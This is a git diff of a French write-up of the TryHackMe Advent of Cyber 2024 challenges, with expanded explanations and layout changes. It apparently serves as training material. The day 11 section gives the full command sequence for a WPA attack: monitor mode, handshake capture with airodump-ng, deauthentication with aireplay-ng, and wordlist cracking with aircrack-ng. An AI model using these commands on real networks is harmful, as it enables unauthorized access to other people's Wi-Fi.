@@ -8,9 +8,18 @@ description: Calendrier de l'avent de la Cyber 2024
 ---
 Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
 
->30/12/2024 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 11, la méthodologie n'est pas rédigée.
+>04/01/2025 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 12, la méthodologie n'est pas rédigée.
 
-![Logo Événement](https://tryhackme-images.s3.amazonaws.com/room-icons/62c435d1f4d84a005f5df811-1728982657816)
+<div class="container">
+    <div class="row">
+        <div class="col-md-6 mt-5">
+            <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62c435d1f4d84a005f5df811-1728982657816" class="img-fluid" alt="Logo Événement">
+        </div>
+        <div class="col-md-6">
+            <img src="https://assets.tryhackme.com/img/badges/aoc5.svg" class="img-fluid" alt="Badge AoC2024">
+        </div>
+    </div>
+</div>
 
 ![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)
 
@@ -966,7 +975,9 @@ THM{[...expurgé...]}
 
 ![Jour 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730305996223.png)
 
-Machine distante : `iw` permet de montrer les dispositifs sans fil
+L'ensemble des commandes est à réaliser sur la machine distante.
+
+Nous commençons par afficher les interfaces sans-fil de la machine.
 
 ```bash
 iw dev
@@ -979,7 +990,7 @@ phy#2
 		txpower 20.00 dBm
 ```
 
-Mode scanner
+Nous utilisons ensuite le mode scanner pour afficher les réseaux Wi-Fi accessibles. Nous observons ainsi un réseau nommé `M[...expurgé...]P` :
 
 ```bash
 sudo iw dev wlan2 scan
@@ -1009,7 +1020,7 @@ BSS 02:[...expurgé...]:00(on wlan2)
 		 * Operating Mode Notification
 ```
 
-Passage en mode écoute (*monitor*)
+Nous passons à présent l'interface en mode écoute (*monitor*) afin de permettre l'analyse du réseau, même sans y être connecté.
 
 ```bash
 # Désactiver l'interface
@@ -1030,7 +1041,9 @@ Interface wlan2
 	txpower 20.00 dBm
 ```
 
-Première instance : capture des paquets ***WPA handshake***
+Nous avons à présent besoin de deux instances {% include dictionary.html word="SSH" %} sur la machine distante afin de lancer notre attaque.
+
+Avec la première instance, nous utilisons `airodump-ng` afin de capturer des paquets ***WPA handshake***
 
 ```txt
 sudo airodump-ng -c 6 --bssid 02:[...expurgé...]:00 -w output-file wlan2
@@ -1045,7 +1058,9 @@ BSSID                  STATION                PWR   Rate    Lost    Frames  Note
 02:[...expurgé...]:00  02:[...expurgé...]:00  -29    0 - 1      0        3 
 ```
 
-2ème instance : déconnexion du client
+Nous pouvons constater qu'une machine est actuellement connectée au réseau que nous analysons.
+
+Depuis la deuxième instance nous utilisons `aireplay-ng` pour forcer la déconnexion du client.
 
 ```bash
 sudo aireplay-ng -0 1 -a 02:[...expurgé...]:00 -c 02:[...expurgé...]:00 wlan2
@@ -1053,7 +1068,9 @@ sudo aireplay-ng -0 1 -a 02:[...expurgé...]:00 -c 02:[...expurgé...]:00 wlan2
 11:09:02  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
 ```
 
-Interception du handshake et forçage du mot de passe
+De retour dans la première instance, nous observons une note `EAPOL` apparaître indiquant qu'un nouveau *handshake* a eu lieu. Nous l'avons capturé grâce à `airodump-ng` et sauvegardé dans les fichiers `output-file*`
+
+Maintenant que nous avons intercepté le *handshake* nous pouvons tenter de craquer le mot de passe avec `aircrack-ng`.
 
 ```bash
 sudo aircrack-ng -a 2 -b 02:[...expurgé...]:00 -w /home/glitch/rockyou.txt output*cap
@@ -1088,6 +1105,11 @@ Read 273 packets.
 ![Web timing attacks](https://img.shields.io/badge/Web%20timing%20attacks-4d354a?logo=tryhackme)
 
 ![Jour 12](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730353204089.png)
+
+<div class="text-center">
+    <i style="font-size: 24px" class="text-info">Rédaction en cours</i><br />
+    <i class="fa-solid fa-spinner fa-spin-pulse fa-2xl text-info mt-3"></i>
+</div>
 
 Nous commençons par ouvrir le site a attaqué, et nous arrivons sur une page de connexion.
 
@@ -1936,8 +1958,3 @@ mosquitto_pub -h localhost -t "d2FyZXZpbGxl/Y2hyaXN0bWFzbGlnaHRz" -m "on"
 ```
 
 {% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_flag.png" caption="Le flag apparaît lorsque le message est correctement envoyé" %}
-
-<div class="text-center">
-    <i class="fa-solid fa-1xl text-info">La suite est pour bientot !</i><br />
-    <i class="fa-solid fa-spinner fa-spin-pulse fa-2xl text-info mt-3"></i>
-</div>
